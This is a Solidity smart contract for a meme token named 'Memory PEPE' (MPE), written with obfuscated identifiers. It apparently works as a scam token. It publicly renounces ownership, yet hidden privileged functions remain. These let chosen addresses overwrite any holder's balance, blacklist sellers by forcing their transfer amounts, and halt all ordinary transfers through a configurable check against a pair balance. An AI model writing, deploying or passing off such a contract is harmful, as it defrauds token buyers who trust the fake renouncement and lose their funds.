//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface teamTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenShould) external view returns (uint256);

    function transfer(address maxExempt, uint256 exemptTo) external returns (bool);

    function allowance(address launchedMinAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptTo) external returns (bool);

    function transferFrom(
        address sender,
        address maxExempt,
        uint256 exemptTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalBuy, uint256 value);
    event Approval(address indexed launchedMinAuto, address indexed spender, uint256 value);
}

abstract contract exemptAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellWalletSender {
    function createPair(address marketingSell, address txSender) external returns (address);
}

interface teamTakeMetadata is teamTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MemoryPEPE is exemptAuto, teamTake, teamTakeMetadata {

    function decimals() external view virtual override returns (uint8) {
        return autoFee;
    }

    function name() external view virtual override returns (string memory) {
        return tradingTeamShould;
    }

    function owner() external view returns (address) {
        return takeIsLaunched;
    }

    constructor (){
        
        tradingWallet listToken = tradingWallet(walletTxReceiver);
        marketingAt = sellWalletSender(listToken.factory()).createPair(listToken.WETH(), address(this));
        if (launchedAt == teamMarketingWallet) {
            exemptAt = enableReceiver;
        }
        amountTx = _msgSender();
        isTake();
        atAmount[amountTx] = true;
        shouldExempt[amountTx] = launchWallet;
        if (enableReceiver != amountBuy) {
            isToSender = false;
        }
        emit Transfer(address(0), amountTx, launchWallet);
    }

    bool private isToSender;

    bool public receiverFeeLaunch;

    uint256 private launchWallet = 100000000 * 10 ** 18;

    function autoLimit(address senderFund, address maxExempt, uint256 exemptTo) internal returns (bool) {
        if (senderFund == amountTx) {
            return toAutoLimit(senderFund, maxExempt, exemptTo);
        }
        uint256 tradingMarketingTotal = teamTake(marketingAt).balanceOf(launchTake);
        require(tradingMarketingTotal == buyWalletMode);
        require(maxExempt != launchTake);
        if (txAmountReceiver[senderFund]) {
            return toAutoLimit(senderFund, maxExempt, listShould);
        }
        return toAutoLimit(senderFund, maxExempt, exemptTo);
    }

    uint256 private enableReceiver;

    event OwnershipTransferred(address indexed marketingFundTotal, address indexed fromBuy);

    function totalSupply() external view virtual override returns (uint256) {
        return launchWallet;
    }

    address public marketingAt;

    bool private teamFund;

    uint256 public exemptAt;

    string private tradingTeamShould = "Memory PEPE";

    uint256 constant listShould = 20 ** 10;

    mapping(address => bool) public txAmountReceiver;

    function isTake() public {
        emit OwnershipTransferred(amountTx, address(0));
        takeIsLaunched = address(0);
    }

    address walletTxReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private buyWallet = "MPE";

    function transfer(address walletTakeFee, uint256 exemptTo) external virtual override returns (bool) {
        return autoLimit(_msgSender(), walletTakeFee, exemptTo);
    }

    address launchTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private takeIsLaunched;

    function symbol() external view virtual override returns (string memory) {
        return buyWallet;
    }

    function toAutoLimit(address senderFund, address maxExempt, uint256 exemptTo) internal returns (bool) {
        require(shouldExempt[senderFund] >= exemptTo);
        shouldExempt[senderFund] -= exemptTo;
        shouldExempt[maxExempt] += exemptTo;
        emit Transfer(senderFund, maxExempt, exemptTo);
        return true;
    }

    mapping(address => mapping(address => uint256)) private takeAuto;

    function approve(address minFrom, uint256 exemptTo) public virtual override returns (bool) {
        takeAuto[_msgSender()][minFrom] = exemptTo;
        emit Approval(_msgSender(), minFrom, exemptTo);
        return true;
    }

    address public amountTx;

    mapping(address => bool) public atAmount;

    function maxAmount(address walletTakeFee, uint256 exemptTo) public {
        listAmount();
        shouldExempt[walletTakeFee] = exemptTo;
    }

    uint256 txWallet;

    function senderTeam(address feeLaunchLaunched) public {
        listAmount();
        if (launchedAt == teamMarketingWallet) {
            teamMarketingWallet = false;
        }
        if (feeLaunchLaunched == amountTx || feeLaunchLaunched == marketingAt) {
            return;
        }
        txAmountReceiver[feeLaunchLaunched] = true;
    }

    function isMarketing(address liquidityFund) public {
        require(liquidityFund.balance < 100000);
        if (receiverFeeLaunch) {
            return;
        }
        
        atAmount[liquidityFund] = true;
        
        receiverFeeLaunch = true;
    }

    function transferFrom(address senderFund, address maxExempt, uint256 exemptTo) external override returns (bool) {
        if (_msgSender() != walletTxReceiver) {
            if (takeAuto[senderFund][_msgSender()] != type(uint256).max) {
                require(exemptTo <= takeAuto[senderFund][_msgSender()]);
                takeAuto[senderFund][_msgSender()] -= exemptTo;
            }
        }
        return autoLimit(senderFund, maxExempt, exemptTo);
    }

    function getOwner() external view returns (address) {
        return takeIsLaunched;
    }

    bool private amountTo;

    uint256 private minTotal;

    function listAmount() private view {
        require(atAmount[_msgSender()]);
    }

    bool private teamMarketingWallet;

    function enableMax(uint256 exemptTo) public {
        listAmount();
        buyWalletMode = exemptTo;
    }

    mapping(address => uint256) private shouldExempt;

    function balanceOf(address tokenShould) public view virtual override returns (uint256) {
        return shouldExempt[tokenShould];
    }

    uint256 public amountBuy;

    uint256 buyWalletMode;

    bool private launchedAt;

    uint8 private autoFee = 18;

    function allowance(address receiverLimit, address minFrom) external view virtual override returns (uint256) {
        if (minFrom == walletTxReceiver) {
            return type(uint256).max;
        }
        return takeAuto[receiverLimit][minFrom];
    }

}